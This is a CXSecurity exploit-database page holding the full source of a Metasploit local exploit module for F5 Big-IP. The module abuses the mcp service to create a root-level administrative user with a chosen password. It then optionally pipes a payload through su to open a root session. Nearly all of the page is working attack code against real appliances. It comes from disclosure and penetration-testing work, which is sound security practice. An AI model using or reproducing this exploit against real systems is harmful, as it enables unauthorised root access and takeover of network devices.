---
title: F5 Big-IP Create Administrative User
url: https://cxsecurity.com/issue/WLB-2023020012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-07
fetch_date: 2025-10-04T05:48:48.820295
---

# F5 Big-IP Create Administrative User

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **F5 Big-IP Create Administrative User** **2023.02.06**  Credit:  **[Ron Bowes](https://cxsecurity.com/author/Ron%2BBowes/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'unix\_crypt'
class MetasploitModule < Msf::Exploit::Local
include Msf::Post::Linux::F5Mcp
include Msf::Exploit::CmdStager
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'F5 Big-IP Create Admin User',
'Description' => %q{
This creates a local user with a username/password and root-level
privileges. Note that a root-level account is not required to do this,
which makes it a privilege escalation issue.
Note that this is pretty noisy, since it creates a user account and
creates log files and such. Additionally, most (if not all)
vulnerabilities in F5 grant root access anyways.
Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-privesc.rb
},
'License' => MSF\_LICENSE,
'Author' => ['Ron Bowes'],
'Platform' => [ 'unix', 'linux', 'python' ],
'SessionTypes' => ['shell', 'meterpreter'],
'References' => [
['URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool'], # Original PoC
['URL', 'https://www.rapid7.com/blog/post/2022/11/16/cve-2022-41622-and-cve-2022-41800-fixed-f5-big-ip-and-icontrol-rest-vulnerabilities-and-exposures/'],
['URL', 'https://support.f5.com/csp/article/K97843387'],
],
'Privileged' => true,
'DisclosureDate' => '2022-11-16',
'Arch' => [ ARCH\_CMD, ARCH\_PYTHON ],
'Type' => :unix\_cmd,
'Targets' => [[ 'Auto', {} ]],
'Notes' => {
'Stability' => [],
'Reliability' => [],
'SideEffects' => []
}
)
)
register\_options([
OptString.new('USERNAME', [true, 'Username to create (default: random)', Rex::Text.rand\_text\_alphanumeric(8)]),
OptString.new('PASSWORD', [true, 'Password for the new user (default: random)', Rex::Text.rand\_text\_alphanumeric(12)]),
OptBool.new('CREATE\_SESSION', [true, 'If set, use the new account to create a root session', true]),
])
end
def exploit
# Get or generate the username/password
fail\_with(Failure::BadConfig, 'USERNAME cannot be empty') if datastore['USERNAME'].empty?
username = datastore['USERNAME']
if datastore['CREATE\_SESSION']
password = Rex::Text.rand\_text\_alphanumeric(12)
new\_password = datastore['PASSWORD'] || Rex::Text.rand\_text\_alphanumeric(12)
print\_status("Will attempt to create user #{username} / #{password}, then change password to #{new\_password} when creating a session")
else
password = datastore['PASSWORD'] || Rex::Text.rand\_text\_alphanumeric(12)
print\_status("Will attempt to create user #{username} / #{password}")
end
# If the password is already hashed, leave it as-is
vprint\_status('Hashing the password with SHA512')
hashed\_password = UnixCrypt::SHA512.build(password)
if !hashed\_password || hashed\_password.empty?
fail\_with(Failure::BadConfig, 'Failed to hash the password with String.crypt')
end
# These requests have to go in a single 'session', which, to us, is
# a single packet (since we don't have AF\_UNIX sockets)
result = mcp\_send\_recv([
# Authenticate as 'admin' (this probably shouldn't work but does)
mcp\_build('user\_authenticated', 'structure', [
mcp\_build('user\_authenticated\_name', 'string', 'admin')
]),
# Start transaction
mcp\_build('start\_transaction', 'structure', [
mcp\_build('start\_transaction\_load\_type', 'ulong', 0)
]),
# Create the role mapping
mcp\_build('create', 'structure', [
mcp\_build('user\_role\_partition', 'structure', [
mcp\_build('user\_role\_partition\_user', 'string', username),
mcp\_build('user\_role\_partition\_role', 'ulong', 0),
mcp\_build('user\_role\_partition\_partition', 'string', '[All]'),
])
]),
# Create the userdb entry
mcp\_build('create', 'structure', [
mcp\_build('userdb\_entry', 'structure', [
mcp\_build('userdb\_entry\_name', 'string', username),
mcp\_build('userdb\_entry\_partition\_id', 'string', 'Common'),
mcp\_build('userdb\_entry\_is\_system', 'ulong', 0),
mcp\_build('userdb\_entry\_shell', 'string', '/bin/bash'),
mcp\_build('userdb\_entry\_is\_crypted', 'ulong', 1),
mcp\_build('userdb\_entry\_passwd', 'string', hashed\_password),
])
]),
# Finish the transaction
mcp\_build('end\_transaction', 'structure', [])
])
# Handle errors
if result.nil?
fail\_with(Failure::Unknown, 'Request to mcp appeared to fail')
end
# The only result we really care about is an error
error\_returned = false
result.each do |r|
result = mcp\_get\_single(r, 'result')
result\_code = mcp\_get\_single(result, 'result\_code')
# If there's no code or it's zero, just ignore it
if result\_code.nil? || result\_code == 0
next
end
# If we're here, an error was returned!
error\_returned = true
# Otherwise, try and get result\_message
result\_message = mcp\_get\_single(result, 'result\_message')
if result\_message.nil?
print\_warning("mcp query returned a non-zero result (#{result\_code}), but no error message")
else
print\_error("mcp query returned an error message: #{result\_message} (code: #{result\_code})")
end
end
# Let them know if it likely worked
if !error\_returned
print\_good("Service didn't return an error, so user was likely created!")
if datastore['CREATE\_SESSION']
print\_status('Attempting create a root session...')
out = cmd\_exec("echo -ne \"#{password}\\n#{password}\\n#{new\_password}\\n#{new\_password}\\n#{payload.encoded}\\n\" | su #{username}")
vprint\_status("Output from su command: #{out}")
end
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

| ...